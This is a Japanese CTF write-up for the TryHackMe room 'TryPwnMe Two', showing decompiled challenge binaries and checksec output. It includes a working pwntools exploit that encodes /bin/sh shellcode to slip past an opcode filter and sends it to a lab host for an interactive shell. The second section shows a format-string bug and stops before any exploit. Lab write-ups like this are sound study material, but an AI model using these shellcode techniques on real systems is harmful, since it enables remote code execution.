# TryPwnMe Two

https://tryhackme.com/room/trypwnmetwo

## TryExecMe 2

```c
undefined8 main(void)
{
  char cVar1;
  code *__buf;
  
  setup();
  banner();
  __buf = (code *)mmap((void *)0xcafe0000,100,7,0x22,-1,0);
  puts("\nGive me your spell, and I will execute it: ");
  read(0,__buf,0x80);
  puts("\nExecuting Spell...\n");
  cVar1 = forbidden(__buf);
  if (cVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  (*__buf)();
  return 0;
}

undefined8 forbidden(long param_1)

{
  ulong local_18;
  
  local_18 = 0;
  while( true ) {
    if (0x7e < local_18) {
      return 0;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '\x05'))
    {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '4')) {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80))
    break;
    local_18 = local_18 + 1;
  }
  puts("Forbidden spell detected!");
  return 1;
}
```

3種類のシェルコードが禁止されている。これにより、単純に /bin/sh を実行するようなシェルコードは成功しないと思われる。

- \x0f\x05	syscall命令	システムコール（例：execveなど）
- \x0f\x34	sysenter命令	古いLinuxカーネル向けシステムコール
- \xcd\x80（= -0x33と-0x80）	int 0x80命令	もっと古いLinuxシステムコール

```shell
$ pwn checksec ./tryexecme2
[*] '/home/kali/CTF/0429/materials-trypwnmetwo/TryExecMe2/tryexecme2'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

ギブアップ。

https://jaxafed.github.io/posts/tryhackme-trypwnme_two/

- 特定のバイト値を含まないようにシェルコードを生成することが可能。  
- xor, rol, decoder stub などのテクニックで自己復号する形になっている。
- 今回のフィルタリングでは \x0f, \xcd の2文字を避ければ十分。

```python
>>> from pwn import *
>>> shellcode = asm(shellcraft.sh())
... encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")
... 
>>> print(encoded_shellcode)
b'\xd9\xd0\xfc\xd9t$\xf4^\x83\xc6\x18\x89\xf7\xac\x93\xac(\xd8\xaa\x80\xeb\xacu\xf5\x8a\xf4d\xcc4\x9c\xe7\x16\xe7\x16\xa4\xd3\xb5(/\x97Eth\xca$\x8d\xf5cp\xf9\x18\xfb\xebS\x9d\x9e|}\x93\x94\x1d\x1e\xefpa\x95\x126\x1b\x8d\xd9BWX\xa4\xa5\xf5&\xb0y\xfcM\xa0\n\xa9\xad\xa6\xffkl8\x19]\xae\x9c%\xfd\xdeIz\xd4\xa6\x83\xed\x86\x91\x07_i6\xefo\xac\x00'
```

```sh
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = remote("10.10.66.255", 5002)

# Generate shellcode to spawn a shell
shellcode = asm(shellcraft.sh())

# Encode the shellcode to avoid 0x0f and 0xcd
encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")

r.recvuntil(b"Give me your spell, and I will execute it: \n")
r.sendline(encoded_shellcode)
r.interactive("$ ")
```

## Not Specified 2

```sh
$ ls
ld-linux-x86-64.so.2  libc.so.6  notspecified2
```

```c
void main(void)
{
  long in_FS_OFFSET;
  char local_218 [520];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("Please provide your username:");
  read(0,local_218,0x200);
  printf("Thanks ");
  printf(local_218);
  FUN_004010c0(0x539);
  return;
}

void FUN_004010c0(int param_1)
{
                    /* WARNING: Subroutine does not return */
  exit(param_1);
}
```

```sh
$ pwn checksec ./notspecified2 
[*] '/home/kali/ctf/pwnme2/materials-trypwnmetwo/NotSpecified2/notspecified2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
